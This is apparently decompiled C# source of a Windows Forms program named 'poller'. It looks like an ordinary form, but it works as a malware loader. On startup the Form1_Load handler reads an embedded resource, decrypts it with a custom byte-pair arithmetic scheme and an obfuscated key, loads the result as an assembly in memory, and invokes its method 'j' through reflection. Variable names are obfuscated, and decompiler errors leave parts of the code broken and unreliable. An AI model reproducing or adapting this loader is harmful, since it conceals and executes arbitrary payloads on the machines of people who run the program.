using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using poller.My.Resources;

namespace poller;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown _NumericUpDown1;

	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon _NotifyIcon1;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("ToolTip1")]
	private ToolTip _ToolTip1;

	[AccessedThroughProperty("DateTimePicker1")]
	private DateTimePicker _DateTimePicker1;

	private byte[] mermantrut;

	private string mthoadrahe;

	private Assembly radiantenu;

	private Type trosishamb;

	internal virtual _003F NumericUpDown1
	{
		get
		{
			return _NumericUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NumericUpDown1 = value;
		}
	}

	internal virtual _003F NotifyIcon_0
	{
		get
		{
			return _NotifyIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NotifyIcon1 = value;
		}
	}

	internal virtual _003F ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListView1 = value;
		}
	}

	internal virtual _003F ToolTip_0
	{
		get
		{
			return _ToolTip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ToolTip1 = value;
		}
	}

	internal virtual _003F DateTimePicker1
	{
		get
		{
			return _DateTimePicker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DateTimePicker1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		components = new Container();
		NumericUpDown1 = new NumericUpDown();
		NotifyIcon_0 = new NotifyIcon(components);
		ListView1 = new ListView();
		ToolTip_0 = new ToolTip(components);
		DateTimePicker1 = new DateTimePicker();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((Control)this).SuspendLayout();
		object numericUpDown = (object)NumericUpDown1;
		Point location = new Point(61, 151);
		((Control)numericUpDown).set_Location(location);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		object numericUpDown2 = (object)NumericUpDown1;
		Size size = new Size(120, 20);
		((Control)numericUpDown2).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(5);
		((NotifyIcon)NotifyIcon_0).set_Text("NotifyIcon1");
		((NotifyIcon)NotifyIcon_0).set_Visible(true);
		object listView = (object)ListView1;
		location = new Point(346, 54);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		object listView2 = (object)ListView1;
		size = new Size(121, 97);
		((Control)listView2).set_Size(size);
		((Control)ListView1).set_TabIndex(4);
		((ListView)ListView1).set_UseCompatibleStateImageBehavior(false);
		object dateTimePicker = (object)DateTimePicker1;
		location = new Point(160, 110);
		((Control)dateTimePicker).set_Location(location);
		((Control)DateTimePicker1).set_Name("DateTimePicker1");
		object dateTimePicker2 = (object)DateTimePicker1;
		size = new Size(8, 20);
		((Control)dateTimePicker2).set_Size(size);
		((Control)DateTimePicker1).set_TabIndex(3);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(529, 224);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)NumericUpDown1);
		((Control)this).get_Controls().Add((Control)ListView1);
		((Control)this).get_Controls().Add((Control)DateTimePicker1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((ISupportInitialize)NumericUpDown1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		mermantrut = (byte[])((ResourceManager)Resources.unknown_0).GetObject((string)Resources.unknown_3);
		mthoadrahe = (string)Resources.unknown_2;
		pppp();
	}

	private void pppp()
	{
		checked
		{
			int num = mermantrut.Length - 2;
			for (int i = 0; i <= num; i += 2)
			{
				int num2 = mermantrut[i];
				int num3 = mermantrut[i + 1];
				int num4 = (int)Math.Round((double)(2 * num3) - Conversions.ToDouble(mthoadrahe) - (double)num2);
				int num5 = (int)Math.Round(Conversions.ToDouble(mthoadrahe) - (double)num2 + (double)num3);
				mermantrut[i] = (byte)unchecked(checked(unchecked(num5 % 256) + 256) % 256);
				mermantrut[i + 1] = (byte)unchecked(checked(unchecked(num4 % 256) + 256) % 256);
			}
			radiantenu = CC.smile(mermantrut);
			trosishamb = (Type)CC.tete(radiantenu, 5);
			trosishamb.GetMethod("j")!.Invoke(null, new object[0]);
		}
	}

	static int smethod_0()
	{
		/*Error near IL_0010: ldarg 1 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}
}
